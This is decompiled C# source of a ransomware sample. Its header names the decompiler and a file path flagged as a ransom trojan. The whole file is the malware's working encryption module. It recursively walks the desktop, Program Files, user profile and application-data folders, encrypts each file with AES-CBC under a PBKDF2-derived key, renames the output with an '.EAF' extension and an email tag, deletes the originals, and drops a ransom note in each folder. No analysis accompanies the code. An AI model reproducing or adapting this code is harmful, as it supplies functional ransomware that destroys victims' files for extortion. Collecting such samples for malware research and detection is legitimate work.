// Decompiled with JetBrains decompiler
// Type: Fast.ENC2
// Assembly: encoderdecryption@yandex.ru, Version=2.0.2.2, Culture=neutral, PublicKeyToken=null
// MVID: C353C6AA-D71D-41FD-A002-1E85FFB3A964
// Assembly location: C:\Users\Administrateur\Downloads\ransomware_new\HEUR-Trojan-Ransom.Win32-d2c47b1c94e6beadbc222771e788e9dafe194c462760b0d16cd25cbc0a572a00.exe

using System;
using System.IO;
using System.Security.Cryptography;
using System.Threading;

namespace Fast
{
  internal class ENC2
  {
    public static ENC2.EAFLocker EL;
    private static string EncryptPassword = Program.RndKey + Program.A + Program.B + Program.UniqueID() + Program.keyword + Program.UniqueID() + Program.C + Program.D + Program.RndKey;

    public static void Start()
    {
      ENC2.EL = new ENC2.EAFLocker();
      new Thread((ThreadStart) (() => ENC2.LookForDirectories())).Start();
    }

    private static void LookForDirectories()
    {
      try
      {
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.NetworkShortcuts));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.PrinterShortcuts));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Recent));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonAdminTools));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonOemLinks));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFilesX86));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPrograms));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonTemplates));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        ENC2.encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData));
      }
      catch
      {
      }
    }

    private static void encryptDirectory(string location)
    {
      try
      {
        string[] files = Directory.GetFiles(location);
        for (int index = 0; index < files.Length; ++index)
        {
          try
          {
            string extension = Path.GetExtension(files[index]);
            string fileName = Path.GetFileName(files[index]);
            if (Array.Exists<string>(Program.validExtensions, (Predicate<string>) (E => E != extension.ToLower())) && extension != ".EAF" && fileName != Program.droppedMessageTextbox && fileName != Program.processURL)
            {
              ENC2.EL.EnceyptFile(files[index]);
              File.WriteAllLines(location + "/" + Program.droppedMessageTextbox, Program.messages);
            }
          }
          catch
          {
          }
        }
        foreach (string directory in Directory.GetDirectories(location))
          ENC2.encryptDirectory(directory);
      }
      catch (Exception ex)
      {
      }
    }

    public class EAFLocker
    {
      public void EnceyptFile(string file)
      {
        try
        {
          string extension = Path.GetExtension(file);
          if (!(extension != ".EAF"))
            return;
          string encryptPassword = ENC2.EncryptPassword;
          string fileName = Path.GetFileName(file);
          string str = Path.GetDirectoryName(file) + "\\[" + Program.email1 + "][" + Program.UniqueID() + "]" + fileName + ".EAF";
          if (!this.Encrypt(file, str, encryptPassword) && extension != ".EAF")
          {
            try
            {
              File.Move(file, str);
            }
            catch
            {
            }
          }
        }
        catch
        {
        }
      }

      private bool Encrypt(string inputFilePath, string outputfilePath, string EncryptionKey)
      {
        try
        {
          using (FileStream fileStream1 = new FileStream(inputFilePath, FileMode.Open))
          {
            using (FileStream fileStream2 = new FileStream(outputfilePath, FileMode.Create))
            {
              fileStream1.Position = 0L;
              using (Aes aes = Aes.Create())
              {
                byte[] salt = new byte[13]
                {
                  (byte) 73,
                  (byte) 118,
                  (byte) 97,
                  (byte) 110,
                  (byte) 32,
                  (byte) 77,
                  (byte) 101,
                  (byte) 100,
                  (byte) 118,
                  (byte) 101,
                  (byte) 100,
                  (byte) 101,
                  (byte) 118
                };
                using (Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(EncryptionKey, salt))
                {
                  aes.Mode = CipherMode.CBC;
                  aes.Padding = PaddingMode.PKCS7;
                  aes.Key = rfc2898DeriveBytes.GetBytes(32);
                  aes.IV = rfc2898DeriveBytes.GetBytes(16);
                  using (CryptoStream cryptoStream = new CryptoStream((Stream) fileStream2, aes.CreateEncryptor(), CryptoStreamMode.Write))
                  {
                    int count1 = 4096;
                    byte[] buffer = new byte[count1];
                    int num = 0;
                    int count2;
                    do
                    {
                      count2 = fileStream1.Read(buffer, 0, count1);
                      if (num <= 400000)
                        cryptoStream.Write(buffer, 0, count2);
                      else if (num >= 800000 && num <= 1200000)
                        cryptoStream.Write(buffer, 0, count2);
                      else if (num >= 1600000 && num <= 2000000)
                        cryptoStream.Write(buffer, 0, count2);
                      else
                        fileStream2.Write(buffer, 0, count2);
                      num += count2;
                    }
                    while (count2 != 0);
                    cryptoStream.Close();
                  }
                }
              }
              fileStream2.Close();
            }
            fileStream1.Close();
          }
          File.Delete(inputFilePath);
          return true;
        }
        catch (SystemException ex)
        {
          return false;
        }
      }
    }
  }
}
